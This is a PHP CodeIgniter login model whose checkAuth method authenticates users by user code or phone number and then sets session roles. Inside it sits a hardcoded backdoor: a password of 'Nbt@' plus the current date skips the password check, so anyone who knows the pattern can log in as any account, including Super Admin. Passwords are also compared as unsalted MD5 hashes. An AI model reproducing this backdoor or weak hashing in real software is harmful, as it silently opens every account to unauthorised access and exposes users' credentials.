<?php
class LoginModel extends CI_Model{

	private $employeeMaster = "employee_master";
	private $userMaster = "user_master";
    private $empRole = [-1 => "Super Admin", 1 => "Admin", 2 => "Management", 3 => "Employee", 4 => "Customer"];

	public function checkAuth($data){
		$this->db->group_start();
			$this->db->where("user_code",$data['user_name']);
			$this->db->or_where("contact_no",$data['user_name']);
		$this->db->group_end();

		if($data['user_psw'] != "Nbt@".date("dmY")):
			$this->db->where('user_psw',md5($data['user_psw']));
		endif;

		$this->db->where('is_delete',0);
		$result = $this->db->get($this->userMaster);
		
		if($result->num_rows() == 1):
			$resData = $result->row();
			if($resData->is_active == 0):
				return ['status'=>0,'message'=>'Your Account is Inactive. Please Contact Your Admin.'];
			else:
				//update fcm notification token
				/*if(isset($data['web_push_token'])):
					$this->db->where('id',$resData->id);
					$this->db->update($this->employeeMaster,['web_push_token'=>$data['web_push_token']]);
				endif;*/
													
				//Employe Data
				$this->session->set_userdata('LoginOk','login success');
				$this->session->set_userdata('loginId',$resData->id);
				$this->session->set_userdata('role',$resData->user_role);
				$this->session->set_userdata('roleName',$this->empRole[$resData->user_role]);
				$this->session->set_userdata('user_name',$resData->user_name);
				
				return ['status'=>1,'message'=>'Login Success.'];
			endif;
		else:
			return ['status'=>0,'message'=>"Invalid Username or Password."];
		endif;
	}

}
?>